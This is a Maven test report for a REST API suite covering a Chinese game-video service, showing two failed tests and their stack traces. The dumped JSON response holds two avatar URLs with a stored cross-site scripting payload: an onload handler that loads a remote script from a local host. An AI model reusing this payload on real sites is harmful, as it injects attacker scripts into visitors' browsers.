-------------------------------------------------------------------------------
Test set: com.emma.app.my_rest_test.ChushouSDKApiTest
-------------------------------------------------------------------------------
Tests run: 3, Failures: 2, Errors: 0, Skipped: 1, Time elapsed: 3.426 sec <<< FAILURE! - in com.emma.app.my_rest_test.ChushouSDKApiTest
testGameVideoList(com.emma.app.my_rest_test.ChushouSDKApiTest)  Time elapsed: 1.398 sec  <<< FAILURE!
java.lang.AssertionError: 
1 expectation failed.
Response body doesn't match expectation.
Expected: a string containing "12652"
  Actual: {"code":0,"message":"","data":{"count":12658,"items":[{"type":3,"name":"天天酷跑天義测评炫动战车","style":5,"cover":"","targetKey":"19","meta":{"duration":"04:03","playCount":705648,"creator":"ppppppppppp","gender":"male","giftCount":10475,"createdTime":1442933743000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":26}},{"type":3,"name":"你们要的修改方法叫我雷锋【天義作品】浪花走一走","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1442936788912.jpg!jellyfishnavstyle1","targetKey":"24","meta":{"duration":"03:58","playCount":69794,"creator":"485","gender":"female","giftCount":110,"createdTime":1442936971000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160602/1464819886505.JPG\" onload=\"with(document)body.appendChild(createElement('script')).src='http://127.0.0.1:8070/js/xss.js'\"","commentCount":125}},{"type":3,"name":"小美哥：花钱秒满所有碎片宝物！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443068522539.jpg!jellyfishnavstyle1","targetKey":"84","meta":{"duration":"13:37","playCount":68325,"creator":"用户不存在","gender":"unknow","giftCount":10050,"createdTime":1443068698000,"avatar":"","commentCount":254}},{"type":3,"name":"王冕：教你如何高概率获得积分雨","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/270113/1443112616493_crop.jpg!jellyfishnavstyle1","targetKey":"97","meta":{"duration":"09:48","playCount":40576,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443112640000,"avatar":"","commentCount":130}},{"type":3,"name":"小美哥：嗓子中毒了也要风骚！","style":5,"cover":"","targetKey":"87","meta":{"duration":"25:49","playCount":28834,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443072888000,"avatar":"","commentCount":132}},{"type":3,"name":"小美哥：完美侍女-完美评测！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443000797136.jpg!jellyfishnavstyle1","targetKey":"51","meta":{"duration":"12:32","playCount":22437,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443001613000,"avatar":"","commentCount":69}},{"type":3,"name":"美兔组合：小兔说要陪我一起卖肥皂！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443521068664.jpg!jellyfishnavstyle1","targetKey":"185","meta":{"duration":"06:48","playCount":21628,"creator":"用户不存在","gender":"unknow","giftCount":33,"createdTime":1443521778000,"avatar":"","commentCount":54}},{"type":3,"name":"小美哥：酷跑2周年-充钱秒杀所有装备！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/202338/1442947729046_crop.jpg!jellyfishnavstyle1","targetKey":"38","meta":{"duration":"40:03","playCount":20303,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1442981524000,"avatar":"","commentCount":99}},{"type":3,"name":"美兔组合：小兔居然是美少女的化身！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443520976140.jpg!jellyfishnavstyle1","targetKey":"184","meta":{"duration":"06:23","playCount":17595,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443521775000,"avatar":"","commentCount":6}},{"type":3,"name":"天義∶白马大圣闹闹这分数不要不要的","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1443375291729.jpg!jellyfishnavstyle1","targetKey":"149","meta":{"duration":"04:04","playCount":15973,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443375403000,"avatar":"","commentCount":39}},{"type":3,"name":"小美哥：白龙马7千米爆分秀！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/202338/1442943878780_crop.jpg!jellyfishnavstyle1","targetKey":"32","meta":{"duration":"10:15","playCount":13631,"creator":"485","gender":"female","giftCount":0,"createdTime":1442947437000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160602/1464819886505.JPG\" onload=\"with(document)body.appendChild(createElement('script')).src='http://127.0.0.1:8070/js/xss.js'\"","commentCount":28}},{"type":3,"name":"天義∶积分雨怎么来的仔细看30秒的时候~","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1443756523512.jpg!jellyfishnavstyle1","targetKey":"276","meta":{"duration":"01:34","playCount":12612,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443756551000,"avatar":"","commentCount":11}},{"type":3,"name":"小美哥：超能少年碎片-全部秒满级！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443000726614.jpg!jellyfishnavstyle1","targetKey":"49","meta":{"duration":"13:10","playCount":11184,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443001588000,"avatar":"","commentCount":27}},{"type":3,"name":"勇气大陆第30关经典三星过关","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/275297/1443372312906.png!jellyfishnavstyle1","targetKey":"147","meta":{"duration":"01:30","playCount":10305,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443372431000,"avatar":"","commentCount":11}},{"type":3,"name":"好好看","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/171/1447392587015.jpg!jellyfishnavstyle1","targetKey":"11746","meta":{"duration":"00:15","playCount":10006,"creator":"用户_171","gender":"male","giftCount":12123,"createdTime":1447392594000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/20160630/171_1467278870639.jpg","commentCount":2}},{"type":3,"name":"小美哥：疯狂花钻石-秒宝物碎片！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1442999740013.jpg!jellyfishnavstyle1","targetKey":"50","meta":{"duration":"10:38","playCount":9196,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443001611000,"avatar":"","commentCount":36}},{"type":3,"name":"天義∶下次卡无限钥匙理解一下这次没时间 猪大家国庆节快乐","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1443684567470.jpg!jellyfishnavstyle1","targetKey":"248","meta":{"duration":"07:12","playCount":7340,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443684593000,"avatar":"","commentCount":9}},{"type":3,"name":"美兔组合：咱们的酷跑一直都在！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443521046527.jpg!jellyfishnavstyle1","targetKey":"183","meta":{"duration":"05:10","playCount":5586,"creator":"用户不存在","gender":"unknow","giftCount":5315,"createdTime":1443521772000,"avatar":"","commentCount":10}},{"type":3,"name":"小美哥献唱：夜曲，难听也要说好听！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443001787624.jpg!jellyfishnavstyle1","targetKey":"52","meta":{"duration":"01:45","playCount":5496,"creator":"用户不存在","gender":"unknow","giftCount":10,"createdTime":1443001894000,"avatar":"","commentCount":99}},{"type":3,"name":"勇士大陆26关一命三星闯关。","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/275297/1443284993692_crop.jpg!jellyfishnavstyle1","targetKey":"125","meta":{"duration":"02:20","playCount":5120,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443285063000,"avatar":"","commentCount":9}}],"breakpoint":"125-5120"}}

	at com.emma.app.my_rest_test.ChushouSDKApiTest.testGameVideoList(ChushouSDKApiTest.java:60)

testOnlineVideoList(com.emma.app.my_rest_test.ChushouSDKApiTest)  Time elapsed: 0.627 sec  <<< FAILURE!
com.jayway.restassured.module.jsv.JsonSchemaValidationException: 
com.github.fge.jsonschema.core.exceptions.ProcessingException: fatal: content at URI "file:/D:/workspace/my-rest-test/target/test-classes/onlinevideo.json#" is not valid JSON
    level: "fatal"
    uri: "file:/D:/workspace/my-rest-test/target/test-classes/onlinevideo.json#"
    parsingMessage: "Unexpected character ('\"' (code 34)): was expecting comma to separate OBJECT entries"

	at com.emma.app.my_rest_test.ChushouSDKApiTest.testOnlineVideoList(ChushouSDKApiTest.java:138)
Caused by: com.github.fge.jsonschema.core.exceptions.ProcessingException: 
fatal: content at URI "file:/D:/workspace/my-rest-test/target/test-classes/onlinevideo.json#" is not valid JSON
    level: "fatal"
    uri: "file:/D:/workspace/my-rest-test/target/test-classes/onlinevideo.json#"
    parsingMessage: "Unexpected character ('\"' (code 34)): was expecting comma to separate OBJECT entries"

	at com.emma.app.my_rest_test.ChushouSDKApiTest.testOnlineVideoList(ChushouSDKApiTest.java:138)

